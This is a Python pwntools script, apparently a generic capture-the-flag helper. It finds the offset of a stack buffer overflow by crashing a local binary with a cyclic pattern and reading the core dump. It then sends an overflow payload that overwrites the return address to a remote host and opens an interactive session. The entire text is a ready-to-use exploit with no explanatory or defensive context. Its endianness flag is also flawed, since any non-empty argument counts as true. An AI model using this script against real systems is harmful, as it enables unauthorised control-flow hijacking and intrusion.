#!/usr/bin/env python3
from pwn import *
import sys

def main():
    if len(sys.argv) != 6:
        print("Need 5 arguments")
    else:
        host = str(sys.argv[1])
        port = int(sys.argv[2])
        address = int(sys.argv[3], 16)
        littleEndian = bool(sys.argv[4])
        binaryName = str(sys.argv[5])



        elf = ELF(binaryName)
        p = process(binaryName)
        p.sendline(cyclic(200, n=8))
        p.wait()

        core = p.corefile
        offset = int(cyclic_find(core.read(core.rsp, 8), n=8))

        print(f"The offset is {offset}")

        conn = remote(host, port)
        if littleEndian == True:
            conn.sendline(b"A"*offset+p64(address))
        else:
            context.endian = 'big'
            conn.sendline(b"A"*offset+p64(address))

        conn.interactive()


if __name__ == "__main__":
    main()
